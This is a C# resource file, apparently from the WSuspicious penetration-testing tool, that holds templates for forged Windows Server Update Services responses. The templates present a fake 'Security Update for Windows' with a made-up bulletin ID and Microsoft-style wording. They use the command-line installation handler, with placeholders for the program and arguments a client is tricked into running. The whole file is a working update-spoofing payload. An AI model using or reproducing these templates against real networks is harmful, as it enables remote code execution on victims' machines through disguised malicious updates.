namespace WSuspicious
{
    public static class ResourceHandler
    {
        public static readonly string NewUpdatesTemplate = @"
<NewUpdates>
	<UpdateInfo>
		<ID>{0}</ID>
		<Deployment>
			<ID>{1}</ID>
			<Action>Install</Action>
			<IsAssigned>true</IsAssigned>
			<LastChangeTime>2020-02-29</LastChangeTime>
			<AutoSelect>0</AutoSelect>
			<AutoDownload>0</AutoDownload>
			<SupersedenceBehavior>0</SupersedenceBehavior>
		</Deployment>
		<IsLeaf>true</IsLeaf>
		<Xml>&lt;UpdateIdentity UpdateID=""{2}"" RevisionNumber=""204"" /&gt;&lt;Properties UpdateType=""Software"" ExplicitlyDeployable=""true"" AutoSelectOnWebSites=""true"" /&gt;&lt;Relationships&gt;&lt;Prerequisites&gt;&lt;AtLeastOne IsCategory=""true""&gt;&lt;UpdateIdentity UpdateID=""0fa1201d-4330-4fa8-8ae9-b877473b6441"" /&gt;&lt;/AtLeastOne&gt;&lt;/Prerequisites&gt;&lt;BundledUpdates&gt;&lt;UpdateIdentity UpdateID=""{3}"" RevisionNumber=""204"" /&gt;&lt;/BundledUpdates&gt;&lt;/Relationships&gt;</Xml>
	</UpdateInfo>
	<UpdateInfo>
		<ID>{4}</ID>
		<Deployment>
			<ID>{5}</ID>
			<Action>Bundle</Action>
			<IsAssigned>true</IsAssigned>
			<LastChangeTime>2020-02-29</LastChangeTime>
			<AutoSelect>0</AutoSelect>
			<AutoDownload>0</AutoDownload>
			<SupersedenceBehavior>0</SupersedenceBehavior>
		</Deployment>
		<IsLeaf>true</IsLeaf>
		<Xml>&lt;UpdateIdentity UpdateID=""{6}"" RevisionNumber=""204"" /&gt;&lt;Properties UpdateType=""Software"" /&gt;&lt;Relationships&gt;&lt;/Relationships&gt;&lt;ApplicabilityRules&gt;&lt;IsInstalled&gt;&lt;False /&gt;&lt;/IsInstalled&gt;&lt;IsInstallable&gt;&lt;True /&gt;&lt;/IsInstallable&gt;&lt;/ApplicabilityRules&gt;</Xml>
	</UpdateInfo>
</NewUpdates>
";

        public static readonly string ExtendedUpdateInfoTemplate = @"
<s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/"">
    <s:Body xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
        <GetExtendedUpdateInfoResponse xmlns=""http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService"">
            <GetExtendedUpdateInfoResult>
                <Updates>
                    <Update>
                        <ID>{0}</ID>
                        <Xml>&lt;ExtendedProperties DefaultPropertiesLanguage=""en"" Handler=""http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/CommandLineInstallation"" MaxDownloadSize=""{1}"" MinDownloadSize=""{2}""&gt;&lt;InstallationBehavior RebootBehavior=""NeverReboots"" /&gt;&lt;/ExtendedProperties&gt;&lt;Files&gt;&lt;File Digest=""{3}"" DigestAlgorithm=""SHA1"" FileName=""{4}"" Size=""{5}"" Modified=""2010-11-25T15:26:20.723""&gt;&lt;AdditionalDigest Algorithm=""SHA256""&gt;{6}&lt;/AdditionalDigest&gt;&lt;/File&gt;&lt;/Files&gt;&lt;HandlerSpecificData type=""cmd:CommandLineInstallation""&gt;&lt;InstallCommand Arguments=""{7}"" Program=""{8}"" RebootByDefault=""false"" DefaultResult=""Succeeded""&gt;&lt;ReturnCode Reboot=""false"" Result=""Succeeded"" Code=""-1"" /&gt;&lt;/InstallCommand&gt;&lt;/HandlerSpecificData&gt;</Xml>
                    </Update>
                    <Update>
                        <ID>{9}</ID>
                        <Xml>&lt;ExtendedProperties DefaultPropertiesLanguage=""en"" MsrcSeverity=""Important"" IsBeta=""false""&gt;&lt;SupportUrl&gt;https://gosecure.net&lt;/SupportUrl&gt;&lt;SecurityBulletinID&gt;MS42-007&lt;/SecurityBulletinID&gt;&lt;KBArticleID&gt;2862335&lt;/KBArticleID&gt;&lt;/ExtendedProperties&gt;</Xml>
                    </Update>
                    <Update>
                        <ID>{10}</ID>
                        <Xml>&lt;LocalizedProperties&gt;&lt;Language&gt;en&lt;/Language&gt;&lt;Title&gt;Bundle Security Update for * Windows (from KB2862335)&lt;/Title&gt;&lt;Description&gt;A security issue has been identified in a Microsoft software product that could affect your system. You can help protect your system by installing this update from Microsoft. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article. After you install this update, you may have to restart your system.&lt;/Description&gt;&lt;UninstallNotes&gt;This software update can be removed by selecting View installed updates in the Programs and Features Control Panel.&lt;/UninstallNotes&gt;&lt;MoreInfoUrl&gt;https://gosecure.net&lt;/MoreInfoUrl&gt;&lt;SupportUrl&gt;https://gosecure.net&lt;/SupportUrl&gt;&lt;/LocalizedProperties&gt;</Xml>
                    </Update>
                    <Update>
                        <ID>{11}</ID>
                        <Xml>&lt;LocalizedProperties&gt;&lt;Language&gt;en&lt;/Language&gt;&lt;Title&gt;Probably-legal-update&lt;/Title&gt;&lt;/LocalizedProperties&gt;</Xml>
                    </Update>
                </Updates>
                <FileLocations>
                    <FileLocation>
                        <FileDigest>{12}</FileDigest>
                        <Url>{13}</Url>
                    </FileLocation>
                </FileLocations>
            </GetExtendedUpdateInfoResult>
        </GetExtendedUpdateInfoResponse>
    </s:Body>
</s:Envelope>
";
    }
}
